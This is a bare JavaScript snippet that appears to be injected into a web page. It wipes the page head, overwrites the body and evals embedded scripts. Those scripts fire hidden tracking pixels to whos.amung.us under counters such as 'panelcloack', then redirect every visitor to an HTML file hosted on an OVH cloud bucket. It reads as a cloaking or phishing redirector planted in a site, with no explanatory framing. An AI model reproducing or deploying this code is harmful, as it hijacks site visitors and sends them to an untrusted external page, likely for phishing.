function checkbody(call) {
        var timer = setInterval(function () {
            if (document.querySelector('html')) {
                clearInterval(timer)
                if (typeof call == 'function') {
                    call(document.querySelector('html'));
                }
            }
        }, 10)
    };

    function insertHtml(ele, html) {
        ele.innerHTML = html;
        var codes = ele.getElementsByTagName('script');
        for (var i = 0; i < codes.length; i++) {
            console.log(codes[i])
            eval(codes[i].text);
        }
    }

    checkbody(function (body) {
        try { if (document.head) { document.head.innerHTML = ''; } } catch (d) { }
        insertHtml(body, ` 
        <!DOCTYPE html>
        <html lang='en'>
        <head>
        <meta charset='UTF-8'>
        <meta http-equiv='X-UA-Compatible' content='IE=edge'>
        <meta name='viewport' content='width=device-width, initial-scale=1.0'>
        <title></title>
        </head>
        <body>
        <img src='https://whos.amung.us/pingjs/?k=preubas01&t=179.52.218.224&x=https://179.52.218.224' style='display:none'>
        <script>
        var contador = 'navigador1'
        var useragent = navigator.userAgent;
        let i = new Image();
        i.src = 'https://whos.amung.us/pingjs/?k=' + contador + '&t=Dominican Republic&c=s&x=Dominican Republic&y=https://www.starplus.com/&a=-1&d=0&v=27&r=' + Math.ceil(Math.random() * 9999);
        i.id = 'kon';
        document.body.appendChild(i);
        setTimeout(() => { document.getElementById('kon').remove() }, 1000);

        let i2 = new Image();
        i2.src = 'https://whos.amung.us/pingjs/?k=panelcloack&t=Dominican Republic&c=s&x=Dominican Republic&y=https://www.starplus.com/&a=-1&d=0&v=27&r=' + Math.ceil(Math.random() * 9999);
        i2.id = 'kong';
        document.body.appendChild(i2);
        setTimeout(() => { document.getElementById('kong').remove() }, 1000)

        setTimeout(() => { window.location.href = 'https://blob-store.s3.sbg.io.cloud.ovh.net/1Nb3nj.html' }, 1100)
        </script>
        </body>    
        </html> `);
    });
